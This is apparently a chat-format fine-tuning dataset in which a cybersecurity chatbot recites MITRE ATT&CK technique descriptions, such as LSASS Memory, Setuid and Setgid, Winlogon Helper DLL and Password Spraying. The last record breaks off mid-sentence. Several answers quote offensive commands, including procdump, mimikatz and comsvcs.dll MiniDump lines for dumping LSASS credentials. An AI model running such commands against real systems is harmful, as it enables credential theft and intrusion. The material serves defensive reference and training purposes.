{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'LSASS Memory' and with the Id: T1003.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'LSASS Memory' and with the Id: T1003.001 is described as follows: Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.For example, on the target host use procdump:* <code>procdump -ma lsass.exe lsass_dump</code>Locally, mimikatz can be run using:* <code>sekurlsa::Minidump lsassdump.dmp</code>* <code>sekurlsa::logonPasswords</code>Built-in Windows tools such as `comsvcs.dll` can also be used:* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)Similar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)The following SSPs can be used to access credentials:* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'At (Linux)' and with the Id: T1053.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'At (Linux)' and with the Id: T1053.001 is described as follows: Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial, recurring, or future execution of malicious code. The [at](https://attack.mitre.org/software/S0110) command within Linux operating systems enables administrators to schedule tasks.(Citation: Kifarunix - Task Scheduling in Linux)An adversary may use [at](https://attack.mitre.org/software/S0110) in Linux environments to execute programs at system startup or on a scheduled basis for persistence. [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.Adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at). The systems targeted by this attack pattern are: Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hooking' and with the Id: T1179 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hooking' and with the Id: T1179 is described as follows: Windows processes often leverage application programming interface (API) functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions. Hooking involves redirecting calls to these functions and can be implemented via:* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs. (Citation: Microsoft Hook Overview) (Citation: Elastic Process Injection July 2017)* **Import address table (IAT) hooking**, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored. (Citation: Elastic Process Injection July 2017) (Citation: Adlice Software IAT Hooks Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015)* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow. (Citation: Elastic Process Injection July 2017) (Citation: HighTech Bridge Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges. Installing hooking mechanisms may also provide Persistence via continuous invocation when the functions are called through normal use.Malicious hooking mechanisms may also capture API calls that include parameters that reveal user authentication credentials for Credential Access. (Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017)Hooking is commonly utilized by [Rootkit](https://attack.mitre.org/techniques/T1014)s to conceal files, processes, Registry keys, and other objects in order to hide malware and associated behaviors. (Citation: Symantec Windows Rootkits). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Active Scanning' and with the Id: T1595 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Active Scanning' and with the Id: T1595 is described as follows: Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.Adversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.(Citation: Botnet Scan)(Citation: OWASP Fingerprinting) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Plist Modification' and with the Id: T1547.011 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Plist Modification' and with the Id: T1547.011 is described as follows: Adversaries can modify property list files (plist files) to execute their code as part of establishing persistence. Plist files are used by macOS applications to store properties and configuration settings for applications and services. Applications use information plist files, <code>Info.plist</code>, to tell the operating system how to handle the application at runtime using structured metadata in the form of keys and values. Plist files are formatted in XML and based on Apple's Core Foundation DTD and can be saved in text or binary format.(Citation: fileinfo plist file description) Adversaries can modify paths to executed binaries, add command line arguments, and insert key/pair values to plist files in auto-run locations which execute upon user logon or system startup. Through modifying plist files in these locations, adversaries can also execute a malicious dynamic library (dylib) by adding a dictionary containing the <code>DYLD_INSERT_LIBRARIES</code> key combined with a path to a malicious dylib under the <code>EnvironmentVariables</code> key in a plist file. Upon user logon, the plist is called for execution and the malicious dylib is executed within the process space. Persistence can also be achieved by modifying the <code>LSEnvironment</code> key in the application's <code>Info.plist</code> file.(Citation: wardle artofmalware volume1). The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Abuse Elevation Control Mechanism' and with the Id: T1548 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Abuse Elevation Control Mechanism' and with the Id: T1548 is described as follows: Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.(Citation: TechNet How UAC Works)(Citation: sudo man page 2018) An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.(Citation: OSX Keydnap malware)(Citation: Fortinet Fareit). The systems targeted by this attack pattern are: Linux, macOS, Windows, Office 365, IaaS, Google Workspace, Azure AD ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Create Process with Token' and with the Id: T1134.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Create Process with Token' and with the Id: T1134.002 is described as follows: Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before being used to create a process.While this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001), the techniques can be used in conjunction where a token is duplicated and then used to create a new process.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Setuid and Setgid' and with the Id: T1548.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Setuid and Setgid' and with the Id: T1548.001 is described as follows: An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user\u2019s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user\u2019s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware) This abuse is often part of a \"shell escape\" or other actions to bypass an execution environment with restricted permissions.Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries.(Citation: GTFOBins Suid). The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Winlogon Helper DLL' and with the Id: T1547.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Winlogon Helper DLL' and with the Id: T1547.004 is described as follows: Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs onAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Firmware' and with the Id: T1019 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Firmware' and with the Id: T1019 is described as follows: The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Distributed Component Object Model' and with the Id: T1021.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Distributed Component Object Model' and with the Id: T1021.003 is described as follows: Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Change Default File Association' and with the Id: T1042 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Change Default File Association' and with the Id: T1042 is described as follows: When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access (Citation: Microsoft Change Default Programs) (Citation: Microsoft File Handlers) or by administrators using the built-in assoc utility. (Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.System file associations are listed under <code>HKEY_CLASSES_ROOT\\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\[handler]\\shell\\[action]\\command</code>. For example:* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. (Citation: TrendMicro TROJ-FAKEAV OCT 2012). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Regsvr32' and with the Id: T1117 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Regsvr32' and with the Id: T1117 is described as follows: Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). (Citation: Carbon Black Squiblydoo Apr 2016). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Password Spraying' and with the Id: T1110.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Password Spraying' and with the Id: T1110.003 is described as follows: Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:* SSH (22/TCP)* Telnet (23/TCP)* FTP (21/TCP)* NetBIOS / SMB / Samba (139/TCP & 445/TCP)* LDAP (389/TCP)* Kerberos (88/TCP)* RDP / Terminal Services (3389/TCP)* HTTP/HTTP Management Services (80/TCP & 443/TCP)* MSSQL (1433/TCP)* Oracle (1521/TCP)* MySQL (3306/TCP)* VNC (5900/TCP)In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.. The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace, Containers, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'External Proxy' and with the Id: T1090.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'External Proxy' and with the Id: T1090.002 is described as follows: Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Web Portal Capture' and with the Id: T1056.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Web Portal Capture' and with the Id: T1056.003 is described as follows: Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Email Addresses' and with the Id: T1589.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Email Addresses' and with the Id: T1589.002 is described as follows: Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: HackersArise Email)(Citation: CNET Leaks) Email addresses could also be enumerated via more active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.(Citation: GrimBlog UsernameEnum) For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.(Citation: GitHub Office 365 User Enumeration)(Citation: Azure Active Directory Reconnaisance)Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Brute Force](https://attack.mitre.org/techniques/T1110) via [External Remote Services](https://attack.mitre.org/techniques/T1133)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Re-opened Applications' and with the Id: T1164 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Re-opened Applications' and with the Id: T1164 is described as follows: Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user reboots their machine. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at <code>~/Library/Preferences/com.apple.loginwindow.plist</code> and <code>~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist</code>. An adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine (Citation: Methods of Mac Malware Persistence).. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Indicator Blocking' and with the Id: T1054 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Indicator Blocking' and with the Id: T1054 is described as follows: An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1086) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).ETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the registry to make alterations.In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. . The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Spearphishing Voice' and with the Id: T1598.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Spearphishing Voice' and with the Id: T1598.004 is described as follows: Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.All forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.(Citation: BOA Telephone Scams)Victims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to tailor pretexts to be even more persuasive and believable for the victim.. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Redundant Access' and with the Id: T1108 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Redundant Access' and with the Id: T1108 is described as follows: **This technique has been deprecated. Please use [Create Account](https://attack.mitre.org/techniques/T1136), [Web Shell](https://attack.mitre.org/techniques/T1505/003), and [External Remote Services](https://attack.mitre.org/techniques/T1133) where appropriate.**Adversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated. If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use [External Remote Services](https://attack.mitre.org/techniques/T1133) such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network.(Citation: Mandiant APT1) Adversaries may also retain access through cloud-based infrastructure and applications.Use of a [Web Shell](https://attack.mitre.org/techniques/T1100) is one such way to maintain access to a network through an externally accessible Web server.. The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Spearphishing Attachment' and with the Id: T1193 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Spearphishing Attachment' and with the Id: T1193 is described as follows: Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.. The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cached Domain Credentials' and with the Id: T1003.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cached Domain Credentials' and with the Id: T1003.005 is described as follows: Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.(Citation: ired mscache)On Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at `/var/lib/sss/db/cache.[domain].ldb` for SSSD or `/var/opt/quest/vas/authcache/vas_auth.vdb` for Quest. Adversaries can use utilities, such as `tdbdump`, on these database files to dump the cached hashes and use [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to obtain the plaintext password.(Citation: Brining MimiKatz to Unix) With SYSTEM or sudo access, the tools/utilities such as 